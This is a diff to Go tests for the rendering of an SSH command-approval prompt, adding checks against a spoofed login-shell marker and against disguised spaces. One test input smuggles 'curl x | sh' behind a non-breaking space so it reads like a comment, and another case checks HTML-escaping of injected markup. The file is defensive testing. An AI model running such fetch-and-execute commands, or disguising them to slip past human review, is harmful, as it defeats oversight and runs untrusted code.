@@ -65,10 +65,21 @@ func TestRenderSSHStdinAndInteractive(t *testing.T) {
 		t.Errorf("stdin:\n%s", m.Text)
 	}
 	p = sshPrompt("apr_ssh4")
-	p.Argv, p.Interactive = "(login shell)", true
+	p.Argv, p.Interactive = "", true
 	m = e.askRun(p)
 	if !strings.Contains(m.Text, "<b>Interactive:</b> what is typed is not shown") {
 		t.Errorf("interactive:\n%s", m.Text)
+	}
+	// Round 1, finding 3: a login shell is marked outside the command
+	// block, so no command can look like one.
+	if strings.Contains(m.Text, "<pre>") || !strings.Contains(m.Text, "<b>Command:</b> <i>none, a login shell</i>\n") {
+		t.Errorf("login shell:\n%s", m.Text)
+	}
+	p = sshPrompt("apr_ssh4b")
+	p.Argv, p.Interactive = "(login shell)", true
+	m = e.askRun(p)
+	if strings.Contains(m.Text, "a login shell") || !strings.Contains(m.Text, "<pre>(login shell)</pre>") {
+		t.Errorf("a command that reads like the marker:\n%s", m.Text)
 	}
 }
 
@@ -87,6 +98,14 @@ func TestRenderSSHHostile(t *testing.T) {
 	}
 	block := between(t, m.Text, "<pre>", "</pre>")
 	if !strings.Contains(block, "\n&lt;/pre&gt;&lt;b&gt;Runs as:&lt;/b&gt; nobody\nEOF\n") {
+		t.Errorf("command block %q", block)
+	}
+	// Round 1, finding 1: a space that isn't U+0020 is shown escaped, so
+	// "notes<NBSP>#" can't read as a word and a comment.
+	p = sshPrompt("apr_ssh5b")
+	p.Argv = "cat notes\u00a0# ; curl x | sh\u3000"
+	m = e.askRun(p)
+	if block := between(t, m.Text, "<pre>", "</pre>"); block != `cat notes\u{00a0}# ; curl x | sh\u{3000}` {
 		t.Errorf("command block %q", block)
 	}
 	// Too long to show is refused, not shortened (docs/05 D9).
